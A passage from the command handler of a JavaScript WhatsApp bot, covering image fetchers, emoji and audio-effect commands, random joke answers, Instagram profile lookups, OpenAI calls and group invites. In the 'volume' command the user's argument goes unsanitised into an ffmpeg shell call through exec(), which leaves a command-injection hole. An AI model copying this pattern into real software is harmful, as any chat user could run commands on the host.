      case "goosebird":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animefeed":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeavatar":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "lizardpic":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "catmeow":
        {
          await NhdStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`);
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "igemoji":
      case "instagramemoji":
        if (!q)
          return replygcnhd(
            "Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`
          );
        await NhdStickWait();
        emote(q, "11");
        break;
      case "iphoneemoji":
        if (!q)
          return replygcnhd(
            "Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`
          );
        await NhdStickWait();
        emote(q, "0");
        break;
      case "googleemoji":
        if (!q)
          return replygcnhd(
            "Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`
          );
        await NhdStickWait();
        emote(q, "1");
        break;
      case "samsungemoji":
        if (!q)
          return replygcnhd(
            "Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`
          );
        await NhdStickWait();
        emote(q, "2");
        break;
      case "microsoftemoji":
        if (!q)
          return replygcnhd(
            "Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`
          );
        await NhdStickWait();
        emote(q, "3");
        break;
      case "whatsappemoji":
        if (!q)
          return replygcnhd(
            "Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`
          );
        await NhdStickWait();
        emote(q, "4");
        break;
      case "twitteremoji":
        if (!q)
          return replygcnhd(
            "Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`
          );
        await NhdStickWait();
        emote(q, "5");
        break;
      case "facebookemoji":
      case "fbemoji":
        if (!q)
          return replygcnhd(
            "Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`
          );
        await NhdStickWait();
        emote(q, "6");
        break;
      case "skypeemoji":
        if (!q)
          return replygcnhd(
            "Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`
          );
        await NhdStickWait();
        emote(q, "7");
        break;
      case "joyemoji":
        if (!q)
          return replygcnhd(
            "Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`
          );
        await NhdStickWait();
        emote(q, "8");
        break;
      case "mojiemoji":
        if (!q)
          return replygcnhd(
            "Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`
          );
        await NhdStickWait();
        emote(q, "9");
      case "pediaemoji":
        if (!q)
          return replygcnhd(
            "Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`
          );
        await NhdStickWait();
        emote(q, "10");
        break;
      case "emoji":
        {
          if (!args.join(" ")) return replygcnhd("Where is the emoji?");
          emoji.get(args.join(" ")).then(async (emoji) => {
            let mese = await NhdBotFunc.sendMessage(
              m.chat,
              {
                image: { url: emoji.images[4].url },
                caption: `Made by ${global.botname}`,
              },
              { quoted: m }
            );
            await NhdBotFunc.sendMessage(
              from,
              { text: "reply #s to this image to make sticker" },
              { quoted: mese }
            );
          });
        }
        break;
      case "volume":
        {
          if (!args.join(" "))
            return replygcnhd(`Example: ${prefix + command} 10`);
          media = await NhdBotFunc.downloadAndSaveMediaMessage(
            quoted,
            "volume"
          );
          if (isQuotedAudio) {
            rname = getRandom(".mp3");
            exec(
              `ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`,
              (err, stderr, stdout) => {
                fs.unlinkSync(media);
                if (err) return replygcnhd("Error!");
                jadie = fs.readFileSync(rname);
                NhdBotFunc.sendMessage(
                  from,
                  { audio: jadie, mimetype: "audio/mp4", ptt: true },
                  { quoted: m }
                );
                fs.unlinkSync(rname);
              }
            );
          } else if (isQuotedVideo) {
            rname = getRandom(".mp4");
            exec(
              `ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`,
              (err, stderr, stdout) => {
                fs.unlinkSync(media);
                if (err) return replygcnhd("Error!");
                jadie = fs.readFileSync(rname);
                NhdBotFunc.sendMessage(
                  from,
                  { video: jadie, mimetype: "video/mp4" },
                  { quoted: m }
                );
                fs.unlinkSync(rname);
              }
            );
          } else {
            replygcnhd("Send video/audio");
          }
        }
        break;
      case "tinyurl":
        {
          if (!q) return replygcnhd("link?");
          const request = require("request");
          request(
            `https://tinyurl.com/api-create.php?url=${q}`,
            function (error, response, body) {
              try {
                replygcnhd(body);
              } catch (e) {
                replygcnhd(e);
              }
            }
          );
        }
        break;
      case "git":
      case "gitclone":
        if (!args[0])
          return replygcnhd(
            `Where is the link?\nExample :\n${prefix}${command} https://github.com/DGNhd/NhdMedia`
          );
        if (!isUrl(args[0]) && !args[0].includes("github.com"))
          return replygcnhd(`Link invalid!!`);
        let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
        let [, user, repo] = args[0].match(regex1) || [];
        repo = repo.replace(/.git$/, "");
        let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
        let filename = (await fetch(url, { method: "HEAD" })).headers
          .get("content-disposition")
          .match(/attachment; filename=(.*)/)[1];
        NhdBotFunc.sendMessage(
          m.chat,
          {
            document: { url: url },
            fileName: filename + ".zip",
            mimetype: "application/zip",
          },
          { quoted: m }
        ).catch((err) => replygcnhd(mess.error));
        break;
      case "spotify":
        {
          if (!isPrem) return replyprem(mess.premium);
          if (!text) return replygcnhd(`Where is the link?`);
          const Spotify = require("./lib/spotify");
          const spotify = new Spotify(text);
          const info = await spotify.getInfo();
          if (info.error)
            return replygcnhd(`The link you provided is not spotify link`);
          const { name, artists, album_name, release_date, cover_url } = info;
          const details = `${themeemoji} *Title:* ${
            name || ""
          }\n${themeemoji} *Artists:* ${(artists || []).join(
            ","
          )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${
            release_date || ""
          }`;
          const response = await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: cover_url }, caption: details },
            { quoted: m }
          );
          const bufferpotify = await spotify.download();
          await NhdBotFunc.sendMessage(
            m.chat,
            { audio: bufferpotify },
            { quoted: response }
          );
        }
        break;
      case "bass":
      case "blown":
      case "deep":
      case "earrape":
      case "fast":
      case "fat":
      case "nightcore":
      case "reverse":
      case "robot":
      case "slow":
      case "smooth":
      case "squirrel":
        try {
          let set;
          if (/bass/.test(command))
            set = "-af equalizer=f=54:width_type=o:width=2:g=20";
          if (/blown/.test(command)) set = "-af acrusher=.1:1:64:0:log";
          if (/deep/.test(command)) set = "-af atempo=4/4,asetrate=44500*2/3";
          if (/earrape/.test(command)) set = "-af volume=12";
          if (/fast/.test(command))
            set = '-filter:a "atempo=1.63,asetrate=44100"';
          if (/fat/.test(command))
            set = '-filter:a "atempo=1.6,asetrate=22100"';
          if (/nightcore/.test(command))
            set = "-filter:a atempo=1.06,asetrate=44100*1.25";
          if (/reverse/.test(command)) set = '-filter_complex "areverse"';
          if (/robot/.test(command))
            set =
              "-filter_complex \"afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75\"";
          if (/slow/.test(command))
            set = '-filter:a "atempo=0.7,asetrate=44100"';
          if (/smooth/.test(command))
            set =
              "-filter:v \"minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120'\"";
          if (/squirrel/.test(command))
            set = '-filter:a "atempo=0.5,asetrate=65100"';
          if (/audio/.test(mime)) {
            await NhdStickWait();
            let media = await NhdBotFunc.downloadAndSaveMediaMessage(quoted);
            let ran = getRandom(".mp3");
            exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
              fs.unlinkSync(media);
              if (err) return replygcnhd(err);
              let buff = fs.readFileSync(ran);
              NhdBotFunc.sendMessage(
                m.chat,
                { audio: buff, mimetype: "audio/mpeg" },
                { quoted: m }
              );
              fs.unlinkSync(ran);
            });
          } else
            replygcnhd(
              `Reply to the audio you want to change with a caption *${
                prefix + command
              }*`
            );
        } catch (e) {
          replygcnhd(e);
        }
        break;
      case "define":
        if (!q) return replygcnhd(`What do you want to define?`);
        try {
          targetfine = await axios.get(
            `http://api.urbandictionary.com/v0/define?term=${q}`
          );
          if (!targetfine) return replygcnhd(mess.error);
          const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
            .replace(/\[/g, "")
            .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
            .replace(/\[/g, "")
            .replace(/\]/g, "")}`;
          NhdBotFunc.sendMessage(m.chat, { text: reply }, { quoted: m });
        } catch (err) {
          console.log(err);
          return replygcnhd(`*${q}* isn't a valid text`);
        }
        break;
      case "can":
        {
          if (!text)
            return replygcnhd(
              `Ask question\n\nExample : ${prefix + command} i dance?`
            );
          let bisa = [`Can`, `Can't`, `Cannot`, `Of Course You Can!!!`];
          let keh = bisa[Math.floor(Math.random() * bisa.length)];
          let jawab = `*Can ${text}*\nAnswer : ${keh}`;
          await replygcnhd(jawab);
        }
        break;
      case "is":
        {
          if (!text)
            return replygcnhd(
              `Ask question\n\nExample : ${prefix + command} she virgin?`
            );
          let apa = [`Yes`, `No`, `It Could Be`, `Thats right`];
          let kah = apa[Math.floor(Math.random() * apa.length)];
          let jawab = `*Is ${text}*\nAnswer : ${kah}`;
          await replygcnhd(jawab);
        }
        break;
      case "when":
        {
          if (!text)
            return replygcnhd(
              `Ask question\n\nExample : ${
                prefix + command
              } will i get married?`
            );
          let kapan = [
            "5 More Days",
            "10 More Days",
            "15 More Days",
            "20 More Days",
            "25 More Days",
            "30 More Days",
            "35 More Days",
            "40 More Days",
            "45 More Days",
            "50 More Days",
            "55 More Days",
            "60 More Days",
            "65 More Days",
            "70 More Days",
            "75 More Days",
            "80 More Days",
            "85 More Days",
            "90 More Days",
            "100 More Days",
            "5 Months More",
            "10 Months More",
            "15 Months More",
            "20 Months More",
            "25 Months More",
            "30 Months More",
            "35 Months More",
            "40 Months More",
            "45 Months More",
            "50 Months More",
            "55 Months More",
            "60 Months More",
            "65 Months More",
            "70 Months More",
            "75 Months More",
            "80 Months More",
            "85 Months More",
            "90 Months More",
            "100 Months More",
            "1 More Year",
            "2 More Years",
            "3 More Years",
            "4 More Years",
            "5 More Years",
            "Tomorrow",
            "The Day After Tomorrow",
          ];
          let koh = kapan[Math.floor(Math.random() * kapan.length)];
          let jawab = `*${command} ${text}*\nAnswer : ${koh}`;
          await replygcnhd(jawab);
        }
        break;
      case "what":
        {
          if (!text)
            return replygcnhd(
              `Ask question\n\nExample : ${prefix + command} is your name?`
            );
          let lel = [
            `Ask Your Gf`,
            `I Dont Know`,
            `I Don't Know, Ask Your Father`,
          ];
          let kah = lel[Math.floor(Math.random() * lel.length)];
          let jawab = `*What ${text}*\nAnswer : ${kah}`;
          await replygcnhd(jawab);
        }
        break;
      case "where":
        {
          if (!text)
            return replygcnhd(
              `Ask question\n\nExample : ${prefix + command} is your name?`
            );
          let wherelol = [
            `In the mountain`,
            `On mars`,
            `On moon`,
            `In the jungle`,
            `I dont know ask your mom`,
            `It could be somewhere`,
          ];
          let kah = wherelol[Math.floor(Math.random() * wherelol.length)];
          let jawab = `*Whwre ${text}*\nAnswer : ${kah}`;
          await replygcnhd(jawab);
        }
        break;
      case "how":
        {
          if (!text)
            return replygcnhd(
              `Ask question\n\nExample : ${prefix + command} to date girl?`
            );
          let gimana = [
            `Ummm...`,
            `It's Difficult Bro`,
            `Sorry Bot Can't Answer`,
            `Try Searching On Google`,
            `Holy Cow! Really???`,
            `Dizzy Ah😴, don't wanna answer`,
            `Ohhh I See:(`,
            `The Patient, Boss:(`,
            `Really dude 🙄`,
          ];
          let kah = gimana[Math.floor(Math.random() * gimana.length)];
          let jawab = `*How ${text}*\nAnswer : ${kah}`;
          await replygcnhd(jawab);
        }
        break;
      case "rate":
        {
          if (!text)
            return replygcnhd(`Example : ${prefix + command} my profile`);
          let ra = [
            "1",
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9",
            "10",
            "11",
            "12",
            "13",
            "14",
            "15",
            "16",
            "17",
            "18",
            "19",
            "20",
            "21",
            "22",
            "23",
            "24",
            "25",
            "26",
            "27",
            "28",
            "29",
            "30",
            "31",
            "32",
            "33",
            "34",
            "35",
            "36",
            "37",
            "38",
            "39",
            "40",
            "41",
            "42",
            "43",
            "44",
            "45",
            "46",
            "47",
            "48",
            "49",
            "50",
            "51",
            "52",
            "53",
            "54",
            "55",
            "56",
            "57",
            "58",
            "59",
            "60",
            "61",
            "62",
            "63",
            "64",
            "65",
            "66",
            "67",
            "68",
            "69",
            "70",
            "71",
            "72",
            "73",
            "74",
            "75",
            "76",
            "77",
            "78",
            "79",
            "80",
            "81",
            "82",
            "83",
            "84",
            "85",
            "86",
            "87",
            "88",
            "89",
            "90",
            "91",
            "92",
            "93",
            "94",
            "95",
            "96",
            "97",
            "98",
            "99",
            "100",
          ];
          let kah = ra[Math.floor(Math.random() * ra.length)];
          let jawab = `*Rate ${text}*\nAnswer : ${kah}%`;
          await replygcnhd(jawab);
        }
        break;
      case "runtime":
        {
          let lowq = `*The Bot Has Been Online For:*\n*${runtime(
            process.uptime()
          )}*`;
          replygcnhd(lowq);
        }
        break;
      case "stupidcheck":
      case "uncleancheck":
      case "hotcheck":
      case "smartcheck":
      case "greatcheck":
      case "evilcheck":
      case "dogcheck":
      case "coolcheck":
      case "waifucheck":
        cantik = body.slice(1);
        const okebnh1 = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        const nhdkak = okebnh1[Math.floor(Math.random() * okebnh1.length)];
        NhdBotFunc.sendMessage(m.chat, { text: nhdkak }, { quoted: m });
        break;
      case "soulmate":
        {
          if (!m.isGroup) return NhdStickGroup();
          let member = participants.map((u) => u.id);
          let me = m.sender;
          let jodoh = member[Math.floor(Math.random() * member.length)];
          NhdBotFunc.sendMessage(
            m.chat,
            {
              text: `👫Your Soulmate Is

@${me.split("@")[0]} ❤️ @${jodoh.split("@")[0]}`,
              contextInfo: {
                mentionedJid: [me, jodoh],
                forwardingScore: 9999999,
                isForwarded: true,
                externalAdReply: {
                  showAdAttribution: true,
                  containsAutoReply: true,
                  title: ` ${global.botname}`,
                  body: `${ownername}`,
                  previewType: "PHOTO",
                  thumbnailUrl: ``,
                  thumbnail: fs.readFileSync(`./NhdMedia/theme/cheemspic.jpg`),
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "couple":
        {
          if (!m.isGroup) return NhdStickGroup();
          let member = participants.map((u) => u.id);
          let orang = member[Math.floor(Math.random() * member.length)];
          let jodoh = member[Math.floor(Math.random() * member.length)];
          NhdBotFunc.sendMessage(
            m.chat,
            {
              text: `@${orang.split("@")[0]} ❤️ @${jodoh.split("@")[0]}
Cieeee, What's Going On❤️💖👀`,
              contextInfo: {
                mentionedJid: [orang, jodoh],
                forwardingScore: 9999999,
                isForwarded: true,
                externalAdReply: {
                  showAdAttribution: true,
                  containsAutoReply: true,
                  title: ` ${global.botname}`,
                  body: `${ownername}`,
                  previewType: "PHOTO",
                  thumbnailUrl: ``,
                  thumbnail: fs.readFileSync(`./NhdMedia/theme/cheemspic.jpg`),
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "coffee":
      case "kopi":
        {
          NhdBotFunc.sendMessage(
            m.chat,
            {
              caption: mess.success,
              image: { url: "https://coffee.alexflipnote.dev/random" },
            },
            { quoted: m }
          );
        }
        break;
      case "wallpaper":
        {
          if (!text) return replygcnhd("Enter Query Title");
          await NhdStickWait();
          let { wallpaper } = require("./lib/scraper");
          anuwallpep = await wallpaper(text);
          result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)];
          NhdBotFunc.sendMessage(
            m.chat,
            {
              caption: `${themeemoji} Title : ${
                result.title
              }\n${themeemoji} Category : ${
                result.type
              }\n${themeemoji} Detail : ${
                result.source
              }\n${themeemoji} Media Url : ${
                result.image[2] || result.image[1] || result.image[0]
              }`,
              image: { url: result.image[0] },
            },
            { quoted: m }
          );
        }
        break;
      case "wikimedia":
        {
          if (!text) return replygcnhd("Enter Query Title");
          await NhdStickWait();
          let { wikimedia } = require("./lib/scraper");
          let anumedia = await wikimedia(text);
          result = anumedia[Math.floor(Math.random() * anumedia.length)];
          NhdBotFunc.sendMessage(
            m.chat,
            {
              caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`,
              image: { url: result.image },
            },
            { quoted: m }
          );
        }
        break;
      case "pick":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!text)
            return replygcnhd(
              `What do you want to pick?\nExample: ${prefix + command} idiot`
            );
          const groupMetadata = m.isGroup
            ? await NhdBotFunc.groupMetadata(m.chat).catch((e) => {})
            : "";
          const participants = m.isGroup
            ? await groupMetadata.participants
            : "";
          let member = participants.map((u) => u.id);
          let me = m.sender;
          let nhdshimts = member[Math.floor(Math.random() * member.length)];
          NhdBotFunc.sendMessage(
            from,
            {
              text: `The most *${text}* here is *@${nhdshimts.split("@")[0]}*`,
              contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                mentionedJid: [nhdshimts],
                externalAdReply: {
                  showAdAttribution: true,
                  title: ` ${global.botname}`,
                  body: `${ownername}`,
                  containsAutoReply: true,
                  previewType: "PHOTO",
                  thumbnailUrl: ``,
                  thumbnail: fs.readFileSync(`./NhdMedia/theme/cheemspic.jpg`),
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "igstalk":
        {
          if (!args[0])
            return replygcnhd(
              `Enter Instagram Username\n\nExample: ${
                prefix + command
              } unucorn_nhd13`
            );
          const fg = require("api-dylux");
          try {
            let res = await fg.igStalk(args[0]);
            let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, "")}
└────────────`;
            await NhdBotFunc.sendMessage(
              m.chat,
              { image: { url: res.profilePic }, caption: te },
              { quoted: m }
            );
          } catch {
            replygcnhd(`Make sure the username comes from *Instagram*`);
          }
        }
        break;
      case "say":
      case "tts":
      case "gtts":
        {
          if (!text) return replygcnhd("Where is the text?");
          let texttts = text;
          const nhdrl = googleTTS.getAudioUrl(texttts, {
            lang: "en",
            slow: false,
            host: "https://translate.google.com",
          });
          return NhdBotFunc.sendMessage(
            m.chat,
            {
              audio: {
                url: nhdrl,
              },
              mimetype: "audio/mp4",
              ptt: true,
              fileName: `${text}.mp3`,
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "fact":
        {
          const { data } = await axios.get(`https://nekos.life/api/v2/fact`);
          return replygcnhd(`${themeemoji} *Fact:* ${data.fact}\n`);
        }
        break;
      case "aixxx":
      case "openaixxx":
        try {
          if (global.keyopenai === "")
            return replygcnhd("Api key limi exceeded");
          if (!q)
            return replygcnhd(
              `Chat with AI.\n\nExample:\n${prefix + command} What is coding`
            );
          const { Configuration, OpenAIApi } = require("openai");
          const configuration = new Configuration({
            apiKey: global.keyopenai,
          });
          const openai = new OpenAIApi(configuration);
          const response = await openai.createCompletion({
            model: "text-davinci-003",
            prompt: q,
            temperature: 0.3,
            max_tokens: 2000,
            top_p: 1.0,
            frequency_penalty: 0.0,
            presence_penalty: 0.0,
          });
          replygcnhd(`${response.data.choices[0].text}`);
        } catch (error) {
          if (error.response) {
            console.log(error.response.status);
            console.log(error.response.data);
            console.log(`${error.response.status}\n\n${error.response.data}`);
          } else {
            console.log(error);
            replygcnhd("Sorry, there seems to be an error :" + error.message);
          }
        }
        break;
      case "aimagexxx":
        try {
          if (global.keyopenai === "")
            return replygcnhd("Apikey limit exceeded");
          if (!q)
            return replygcnhd(
              `Generate image from AI.\n\nExample:\n${
                prefix + command
              } man riding horse`
            );
          const { Configuration, OpenAIApi } = require("openai");
          const configuration = new Configuration({
            apiKey: global.keyopenai,
          });
          const openai = new OpenAIApi(configuration);
          const response = await openai.createImage({
            prompt: text,
            n: 1,
            size: "512x512",
          });
          //console.log(response.data.data[0].url)
          NhdBotFunc.sendImage(from, response.data.data[0].url, text, m);
        } catch (err) {
          console.log(err);
          replygcnhd("Sorry, there seems to be an error :" + err);
        }
        break;
      case "myip":
        {
          if (!NhdTheCreator) return NhdStickOwner();
          if (m.isGroup) return NhdStickPrivate();
          var http = require("http");
          http.get(
            {
              host: "api.ipify.org",
              port: 80,
              path: "/",
            },
            function (resp) {
              resp.on("data", function (ip) {
                replygcnhd("🔎 My public IP address is: " + ip);
              });
            }
          );
        }
        break;
      case "mathquiz":
      case "math":
        {
          if (kuismath.hasOwnProperty(m.sender.split("@")[0]))
            throw "There are still unfinished sessions!";
          let { genMath, modes } = require("./lib/math");
          if (!text)
            return replygcnhd(
              `Mode: ${Object.keys(modes).join(
                " | "
              )}\nUsage example: ${prefix}math medium`
            );
          let result = await genMath(text.toLowerCase());
          NhdBotFunc.sendText(
            m.chat,
            `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(
              result.waktu / 1000
            ).toFixed(2)} second`,
            m
          ).then(() => {
            kuismath[m.sender.split("@")[0]] = result.jawaban;
          });
          await sleep(result.waktu);
          if (kuismath.hasOwnProperty(m.sender.split("@")[0])) {
            console.log("Answer: " + result.jawaban);
            replygcnhd(
              "Time has run out\nAnswer: " + kuismath[m.sender.split("@")[0]]
            );
            delete kuismath[m.sender.split("@")[0]];
          }
        }
        break;
      case "lyrics":
        {
          if (!text)
            return replygcnhd(
              `What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`
            );
          await NhdStickWait();
          const { lyrics, lyricsv2 } = require("@bochilteam/scraper");
          const result = await lyricsv2(text).catch(
            async (_) => await lyrics(text)
          );
          replygcnhd(
            `
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim()
          );
        }
        break;
      case "gdrive":
        {
          if (!args[0]) return replygcnhd(`Enter the Google Drive link`);
          await NhdStickWait();
          const fg = require("api-dylux");
          try {
            let res = await fg.GDriveDl(args[0]);
            await replygcnhd(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`);
            NhdBotFunc.sendMessage(
              m.chat,
              {
                document: { url: res.downloadUrl },
                fileName: res.fileName,
                mimetype: res.mimetype,
              },
              { quoted: m }
            );
          } catch {
            replygcnhd("Error: Check link or try another link");
          }
        }
        break;
      case "invite":
        {
          if (!m.isGroup) return NhdStickGroup();
          if (!isBotAdmins) return NhdStickBotAdmin();
          if (!text)
            return replygcnhd(
              `Enter the number you want to invite to the group\n\nExample :\n*${
                prefix + command
              }* 916909137213`
            );
          if (text.includes("+"))
            return replygcnhd(`Enter the number together without *+*`);
          if (isNaN(text))
            return replygcnhd(
              `Enter only the numbers plus your country code without spaces`
            );
          let group = m.chat;
          let link =
            "https://chat.whatsapp.com/" +
            (await NhdBotFunc.groupInviteCode(group));
          await NhdBotFunc.sendMessage(text + "@s.whatsapp.net", {
            text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`,
            mentions: [m.sender],
          });
          replygcnhd(` An invite link is sent to the user`);
        }
        break;
      case "pinterest":
        {
          if (!text) return replygcnhd(`Enter Query`);
          await NhdStickWait();
          let { pinterest } = require("./lib/scraper");
          anutrest = await pinterest(text);
          result = anutrest[Math.floor(Math.random() * anutrest.length)];
          NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: result }, caption: "⭔ Media Url : " + result },
            { quoted: m }
          );
        }
        break;
      case "ringtone":
        {
          if (!text)
            return replygcnhd(`Example : ${prefix + command} black rover`);
          let { ringtone } = require("./lib/scraper");
          let anutone2 = await ringtone(text);
          let result = anutone2[Math.floor(Math.random() * anutone2.length)];
          NhdBotFunc.sendMessage(
            m.chat,
            {
              audio: { url: result.audio },
              fileName: result.title + ".mp3",
              mimetype: "audio/mpeg",
            },
            { quoted: m }
          );
        }
        break;
      case "genshin":
        if (!text) return replygcnhd(`Which genshin are you lookin for?`);
        try {
          const genshin = require("genshin-api");
          a = text.toLowerCase();
          const anime = await genshin.Characters(text);
          let txt = "";
          txt += `🎀 *Name:* ${anime.name}\n`;
          txt += `🎖️ *Title:* ${anime.title}\n`;
          txt += `💠 *Vision:* ${anime.vision}\n`;
          txt += `🏹 *Weapon:* ${anime.weapon}\n`;
          txt += `💮 *Gender:* ${anime.gender}\n`;
          txt += `🌏 *Nation:* ${anime.nation}\n`;
          txt += `🪷 *Affiliation:* ${anime.affiliation}\n`;
          txt += `🌟 *Rarity:* ${anime.rarity}\n`;
          txt += `❄️ *Constellation:* ${anime.constellation}\n`;
          txt += `📖 *Description:* ${anime.description}\n`;
          txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`;
          urll = `https://api.genshin.dev/characters/${a}/portrait`;
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: urll }, caption: txt },
            { quoted: m }
          );
        } catch (err) {
          console.log(err);
          return replygcnhd("Error");
        }
        break;
      case "patrick":
      case "patricksticker":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGNhd/NhdMedia/main/patrick"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await NhdBotFunc.sendImageAsSticker(from, wifegerakx, m, {
            packname: global.packname,
            author: global.author,
          });
        }
        break;
      case "dogesticker":
      case "dogestick":
      case "doge":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGNhd/NhdMedia/main/doge"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await NhdBotFunc.sendImageAsSticker(from, wifegerakx, m, {
            packname: global.packname,
            author: global.author,
          });
        }
        break;
      case "lovesticker":
      case "lovestick":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGNhd/NhdMedia/main/love"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await NhdBotFunc.sendImageAsSticker(from, wifegerakx, m, {
            packname: global.packname,
            author: global.author,
          });
        }
        break;
      case "gura":
      case "gurastick":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGNhd/NhdMedia/main/gura"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await NhdBotFunc.sendImageAsSticker(from, wifegerakx, m, {
            packname: global.packname,
            author: global.author,
          });
        }
        break;
      case "anime":
        {
          if (!text) return replygcnhd(`Which anime are you lookin for?`);
          const malScraper = require("mal-scraper");
          await NhdStickWait();
          const anime = await malScraper
            .getInfoFromName(text)
            .catch(() => null);
          if (!anime) return replygcnhd(`Could not find`);
          let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`;
          await NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: anime.picture }, caption: animetxt },
            { quoted: m }
          );
        }
        break;
      case "imdb":
